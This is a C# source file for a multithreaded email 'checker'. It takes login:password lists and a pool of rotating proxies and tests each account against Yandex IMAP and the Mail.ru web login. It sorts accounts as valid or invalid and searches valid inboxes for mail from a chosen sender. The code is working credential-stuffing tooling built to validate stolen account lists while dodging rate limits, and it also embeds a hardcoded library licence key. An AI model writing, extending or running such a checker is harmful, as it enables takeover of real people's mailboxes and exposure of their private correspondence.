using System;
using System.Collections.Concurrent;
using System.Threading;
using Chilkat;
using System.IO;
using System.Text.RegularExpressions;





namespace Mail_Checker
{

    class ProxyStats
    {
        public string proxy;
        public int stats;

        public ProxyStats(string proxy, int stats)
        {
            this.proxy = proxy;
            this.stats = stats;
        }
    }


    class Checker
    {

        public event EventHandler<CheckEventArgs> OneCheckDone;

        char[] separs = { ':', ';' };
        public ConcurrentStack<string> mails;
        ConcurrentQueue<ProxyStats> proxys;
        string query;
        string queryLong = "";

        int workingThreads = 0, errors = 0, valid = 0, novalid = 0;
        int threads, timeout;
        bool started = false;

        public Checker(string[] mails, string[] proxys, string query, int threads, int timeout)
        {
            this.mails = new ConcurrentStack<string>(mails);

            this.proxys = new ConcurrentQueue<ProxyStats>();

            for (int i = 0; i < proxys.Length; i++)
            {
                this.proxys.Enqueue(new ProxyStats(proxys[i], 5));
            }
            

            this.query = query;
            this.threads = threads;
            this.timeout = timeout;



            string[] splitted = query.Split(new char[] { '.', '@' });
            for (int i = 0; i < splitted.Length; i++)
            {
                if (splitted[i] != "")
                {
                    queryLong += "from " + splitted[i];
                    queryLong += (i != (splitted.Length - 1)) ? (" ") : ("");
                }
            }
            
        }


        public void Start()
        {
            started = true;


            ThreadPool.SetMaxThreads(threads * 2, threads * 20);
            ThreadPool.SetMinThreads(threads, threads * 10);


            for (int i = 0; i < threads; i++)
            {
                ThreadPool.QueueUserWorkItem(new WaitCallback(Check));
            }
        }

        public void Stop()
        {
            started = false;
        }




        void Check(object e)
        {

            workingThreads++;



            while (mails.Count > 0 && proxys.Count > 0 && started)
            {

                string mailLine;

                if (!mails.TryPop(out mailLine)) continue;

                string[] mailElements = mailLine.Split(separs);
                if (mailElements.Length != 2) continue;


                string serv = WhatDomain(mailElements[0]);

                if (serv == "") continue;

                ProxyStats proxyLine;
                if (!proxys.TryDequeue(out proxyLine))
                {
                    mails.Push(mailLine);
                    continue;
                }
                string[] proxyElements = proxyLine.proxy.Split(separs);

                if (proxyElements.Length != 2 || Regex.Matches(proxyElements[0], "((25[0-5]|2[0-4]\\d|[01]?\\d\\d?)\\.){3}(25[0-5]|2[0-4]\\d|[01]?\\d\\d?)").Count == 0 ||
                    Regex.Matches(proxyElements[1], "^[0-9]*$").Count == 0)
                {
                    mails.Push(mailLine);
                    continue;
                }


                int messNum=0;
                CheckErrors error = CheckErrors.noError;

                if (serv == "imap.mail.ru") MailRuCheck(mailElements, proxyElements, out messNum, out error);
                else if (serv == "imap.yandex.ru") //YandexCheck(mailElements, proxyElements, out messNum, out error);
                    ImapMailsCheck(mailElements, serv, proxyElements, out messNum, out error);
                else
                {
                    proxys.Enqueue(proxyLine);
                    continue;
                }

                if (error == CheckErrors.proxyError)
                {
                    errors++;
                    mails.Push(mailLine);
                    proxyLine.stats--;
                    if (proxyLine.stats > 0) proxys.Enqueue(proxyLine);
                }
                else if (error == CheckErrors.noError)
                {
                    valid++;
                    proxyLine.stats=5;
                    proxys.Enqueue(proxyLine);
                }
                else if (error == CheckErrors.mailError)
                {
                    novalid++;
                    proxys.Enqueue(proxyLine);
                }
                else if (error == CheckErrors.connectError)
                {
                    errors++;
                    mails.Push(mailLine);
                    proxys.Enqueue(proxyLine);
                }



                MailInfo mInfo = new MailInfo(mailElements[0], mailElements[1], messNum);
                CheckState chState = new CheckState(mails.Count + workingThreads, proxys.Count + workingThreads, errors, valid, novalid, workingThreads);
                OneCheckDone(this, new CheckEventArgs(error, mInfo, chState));



            }




            workingThreads--;

        }

        public static string WhatDomain(string mail)
        {
            string serv = "";
            if (mail.Contains("@yandex.ru")) serv = "imap.yandex.ru";

            //else if (mail.Contains("@mail.ru") || mail.Contains("@list.ru")
            //|| mail.Contains("@inbox.ru") || mail.Contains("@bk.ru")) serv = "imap.mail.ru";

            //else if (mail.Contains("@rambler.ru")) serv = "imap.rambler.ru";

            //else if (mail.Contains("@qip.ru") || mail.Contains("@pochta.ru") ||
            //    mail.Contains("@fromru.com") || mail.Contains("@front.ru") ||
            //    mail.Contains("@hotbox.ru") || mail.Contains("@hotmail.ru") ||
            //    mail.Contains("@krovatka.su") || mail.Contains("@land.ru") ||
            //    mail.Contains("@mail15.com") || mail.Contains("@mail333.com") ||
            //    mail.Contains("@newmail.ru") || mail.Contains("@nightmail.ru") ||
            //    mail.Contains("@nm.ru") || mail.Contains("@pisem.net") ||
            //    mail.Contains("@pochtamt.ru") || mail.Contains("@pop3.ru") ||
            //    mail.Contains("@rbcmail.ru") || mail.Contains("@smtp.ru") ||
            //    mail.Contains("@5ballov.ru") || mail.Contains("@aeterna.ru") ||
            //    mail.Contains("@ziza.ru") || mail.Contains("@memori.ru") ||
            //    mail.Contains("@photofile.ru") || mail.Contains("@fotoplenka.ru") ||
            //    mail.Contains("@pochta.com")) serv = "imap.qip.ru";

            else serv = "";
            return serv;
        }

        private void MailRuCheck(string[] mailElements, string[] proxyElements, out int messNum, out CheckErrors error)
        {

            string[] loginDomain = mailElements[0].Split(new char[] { '@' });


            messNum = 0;
            error = CheckErrors.noError;
            bool success = true;

            Http http = new Http();
            http.UnlockComponent("1QCDO-156DU-TN61L-13B9N-HQO0G");
            http.FollowRedirects = true;
            http.SendCookies = true;
            http.SaveCookies = true;
            http.CookieDir = "memory";
            http.MaxResponseSize = 100000;

            http.ConnectTimeout = timeout;
            http.ReadTimeout = timeout;
            http.ProxyDomain = proxyElements[0];
            http.ProxyPort = Convert.ToInt32(proxyElements[1]);




            HttpRequest req = new HttpRequest();
            req.AddParam("Domain", loginDomain[1]);
            req.AddParam("Login", loginDomain[0]);
            req.AddParam("Password", mailElements[1]);
            req.AddParam("saveauth", "0");
            req.Path = "/cgi-bin/auth?from=splash";
            req.HttpVerb = "POST";
            

            //логин-запрос
            HttpResponse resp = null;
            resp = http.SynchronousRequest("auth.mail.ru", 443, true, req);

            //если пуст, то ошибка прокси
            if (resp == null)
            {
                success = false;
                error = CheckErrors.proxyError;
            }
            //если содержит фейл или блок, то ошибка почты
            else if (resp.BodyStr.Contains( mailElements[0] + "&fail=1") || resp.BodyStr.Contains("почтовый ящик был взломан"))
            {
                success = false;
                error = CheckErrors.mailError;
            }
            //если не содержит мейлру, то ошибка прокси
            else if (!resp.BodyStr.Contains("inbox/?back=1"))
            {
                success = false;
                error = CheckErrors.proxyError;
            }

            //поиск-запрос
            HttpResponse resp2 = null;
            if (success)
            {
                HttpRequest req2 = new HttpRequest();
                req2.HttpVerb = "GET";
                req2.Path = "/search/";
                req2.AddParam("q_from", query);
                
                resp2 = http.SynchronousRequest("e.mail.ru", 443, true, req2);

            }

            //если пустой или не содержит поиска, то ошибка соединения
            if (error == CheckErrors.noError && (resp2 == null || !resp2.BodyStr.Contains("SearchPerson")))
            {
                success = false;
                error = CheckErrors.connectError;
            }


            //поиск сообщний
            if (success)
            {
                MatchCollection foundCollection = Regex.Matches(resp2.BodyStr, "\"count\":.*");
                if (foundCollection.Count > 0)
                {
                    string found = foundCollection[0].Value.Replace("\"count\":", "");
                    messNum = Convert.ToInt32(found);
                }
                else messNum = 0;
                //if (messNum != 0)
                //{
                //    File.CreateText("C:\\Users\\Max\\Desktop\\123\\" + mailElements[0]+"_1").Write(resp.BodyStr);
                //    File.CreateText("C:\\Users\\Max\\Desktop\\123\\" + mailElements[0] + "_2").Write(resp2.BodyStr);
                //}
            }


            http.CloseAllConnections();
            http.Dispose();

        }

        private void ImapMailsCheck(string[] mailElements, string serv, string[] proxyElements, out int messNum, out CheckErrors error)
        {
            bool success = true;
            messNum = 0;
            error = CheckErrors.noError;


            Imap imap = new Imap();
            imap.ConnectTimeout = timeout;
            imap.ReadTimeout = timeout;
            imap.Ssl = true;
            imap.Port = 993;
            imap.UnlockComponent("1QCDO-156DU-TN61L-13B9N-HQO0G");


            imap.HttpProxyHostname = proxyElements[0];
            imap.HttpProxyPort = Convert.ToInt32(proxyElements[1]);


            success = imap.Connect(serv);



            if (success == true)
            {
                success = imap.Login(mailElements[0], mailElements[1]);
            }
            else if (error == CheckErrors.noError) error = CheckErrors.proxyError;

            

            if (success == true)
            {
                success = imap.SelectMailbox("INBOX");
                
            }
            else if (error == CheckErrors.noError) error = CheckErrors.mailError;


            MessageSet messageSet = null;
            if (success == true)
            {
                messageSet = imap.Search(queryLong, false);  
            }
            else if (error == CheckErrors.noError) error = CheckErrors.connectError;

            if (messageSet != null) messNum += messageSet.Count;
            else if (error == CheckErrors.noError) error = CheckErrors.connectError;

            //if (success == true)
            //{
            //    success = imap.SelectMailbox("Удалённые");
            //}
            //else if (error == CheckErrors.noError) error = CheckErrors.connectError;

            //if (success == true)
            //{
            //    MessageSet messageSet = imap.Search(queryLong, true);
            //    if (messageSet != null) messNum += messageSet.Count;
            //}
            //else if (error == CheckErrors.noError) error = CheckErrors.connectError;


            imap.Disconnect();
            imap.Dispose();
        }




        //private void YandexCheck(string[] mailElements, string[] proxyElements, out int messNum, out CheckErrors error)
        //{


        //    messNum = 0;
        //    error = CheckErrors.noError;
        //    bool success = true;

        //    Http http = new Http();
        //    http.UnlockComponent("1QCDO-156DU-TN61L-13B9N-HQO0G");
        //    http.FollowRedirects = true;
        //    http.SendCookies = true;
        //    http.SaveCookies = true;
        //    http.CookieDir = "memory";
        //    http.MaxResponseSize = 100000;

        //    http.ConnectTimeout = timeout;
        //    http.ReadTimeout = timeout;
        //    http.ProxyDomain = proxyElements[0];
        //    http.ProxyPort = Convert.ToInt32(proxyElements[1]);
        //    http.UserAgent = "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.99 Safari/537.36";

        //    //=======================================
        //    HttpRequest req = new HttpRequest();
        //    req.AddHeader("mode", "auth");
        //    req.AddHeader("from", "mail");
        //    req.AddHeader("origin", "hostroot_ru_reliable_l_enter");
        //    req.AddHeader("retpath", "https://mail.yandex.ru");
        //    req.AddParam("login", mailElements[0]);
        //    req.AddParam("passwd", mailElements[1]);
        //    req.AddParam("twoweeks", "yes");
        //    req.Path = "/passport";
        //    req.HttpVerb = "POST";


        //    //логин-запрос
        //    HttpResponse resp = null;
        //    resp = http.SynchronousRequest("passport.yandex.ru", 443, true, req);


        //    //если пуст, то ошибка прокси
        //    if (resp == null)
        //    {
        //        success = false;
        //        error = CheckErrors.proxyError;
        //    }
        //    //если содержит фейл или блок, то ошибка почты
        //    else if (resp.BodyStr.Contains("error-msg") /*|| resp.BodyStr.Contains("почтовый ящик был взломан")*/)
        //    {
        //        success = false;
        //        error = CheckErrors.mailError;
        //    }
        //    //если не содержит, то ошибка прокси
        //    else if (!resp.BodyStr.Contains("yandex.ru\">Яндекс"))
        //    {
        //        success = false;
        //        error = CheckErrors.proxyError;
        //    }

        //    //поиск-запрос
        //    HttpResponse resp2 = null;
        //    if (success)
        //    {

        //        HttpRequest req7 = new HttpRequest();
        //        req7.AddHeader("_h", "messages,messages-pager");
        //        req7.AddParam("_handlers", "messages");
        //        req7.AddParam("search", "yes");
        //        req7.AddParam("scope", "hdr_from");
        //        req7.AddParam("request", "yandex.ru");
        //        req7.AddParam("_page", "messages");
        //        req7.AddParam("_service", "mail");
        //        req7.AddParam("_locale", "ru");
        //        req7.Path = "/neo2/handlers/handlers3.jsx";
        //        req7.HttpVerb = "POST";

        //        string lol = "";
        //        for (int i = 0; i < resp.NumCookies; i++)
        //        {
                    
        //            lol += resp.GetCookieName(i) + "=" + resp.GetCookieValue(i) + "; ";
        //        }
        //        lol += http.GetCookieXml("mail.yandex.ru");
        //        req7.AddHeader("Cookie", lol);
        //        //HttpRequest req2 = new HttpRequest();
        //        //req2.HttpVerb = "GET";
        //        //req2.Path = "/neo2/?#search/scope=hdr_from&request=" + query;

        //        resp2 = http.SynchronousRequest("mail.yandex.ru", 443, true, req7);

        //    }

        //    //если пустой или не содержит поиска, то ошибка соединения
        //    if (error == CheckErrors.noError && (resp2 == null /*|| !resp2.BodyStr.Contains("SearchPerson")*/))
        //    {
        //        success = false;
        //        error = CheckErrors.connectError;
        //    }


        //    //поиск сообщний
        //    if (success)
        //    {
        //        MatchCollection foundCollection = Regex.Matches(resp2.BodyStr, "\"count\":.*");
        //        if (foundCollection.Count > 0)
        //        {
        //            string found = foundCollection[0].Value.Replace("\"count\":", "");
        //            messNum = Convert.ToInt32(found);
        //        }
        //        else messNum = 0;
        //        //if (messNum != 0)
        //        //{
        //        //    File.CreateText("C:\\Users\\Max\\Desktop\\123\\" + mailElements[0]+"_1").Write(resp.BodyStr);
        //        //    File.CreateText("C:\\Users\\Max\\Desktop\\123\\" + mailElements[0] + "_2").Write(resp2.BodyStr);
        //        //}
        //    }


        //    http.CloseAllConnections();
        //    http.Dispose();

        //}


    }
}
